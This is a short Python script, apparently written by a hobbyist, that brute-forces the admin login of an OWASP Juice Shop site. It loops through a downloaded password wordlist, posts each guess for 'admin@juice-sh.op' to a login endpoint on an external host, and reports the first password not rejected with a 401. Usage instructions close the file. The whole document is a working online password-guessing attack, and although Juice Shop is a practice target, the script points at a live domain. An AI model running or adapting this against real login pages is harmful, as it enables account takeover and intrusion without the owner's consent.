import requests
#this is a simple Brute Force, used on the JUICE SHOP website

#BEST1050.TXT is my wordlist for passwords
#I got this wordlist from... Github: danielmiessler/SecLists

with open("best1050.txt", "r") as file:
    passwords = file.readlines()

for password in passwords:
        password = password.strip()
#admin@juice-sh.op... I found this email with an email finder
        data = {"email": "admin@juice-sh.op", "password": password}
        response = requests.post("http://shop.bancocn.com./rest/user/login", json=data)
        code = response.status_code
        print("{} - {}".format(password, code))
#If the password is wrong it shows 401
        if code != 401:
            #If the password is correct, it will show PASSOWORD FIND
            print("[ + ]PASSWORD FIND {}".format(password))
            break

#HOW TO USE?
#on your Terminal:
#      python3 webapp.py